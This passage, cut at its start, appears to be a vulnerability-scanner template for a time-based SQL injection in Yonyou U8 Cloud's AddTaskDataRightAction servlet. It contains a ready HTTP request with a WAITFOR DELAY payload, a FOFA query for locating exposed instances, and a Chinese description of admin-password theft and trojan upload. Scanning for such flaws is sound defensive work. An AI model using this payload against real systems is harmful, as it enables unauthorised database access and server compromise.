          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        - |
          GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
id: yongyouU8-Cloud-AddTaskDataRightAction-sql
info:
    author: Superhero
    description: |-
        fofa: title=="U8C"
        用友U8 Cloud AddTaskDataRightAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 用友U8 Cloud AddTaskDataRightAction SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487295&idx=1&sn=2c539286bf77ff262154f3a334790b3f&chksm=c267ba0cf510331a490f7c604ed69f4c361a906ee3dc40c0a76ee5cffc879cb6f21b64cba507&token=2053938247&lang=zh_CN#rd
    severity: high
    tags:
        - 用友u8
        - Servlet
        - 用友U8
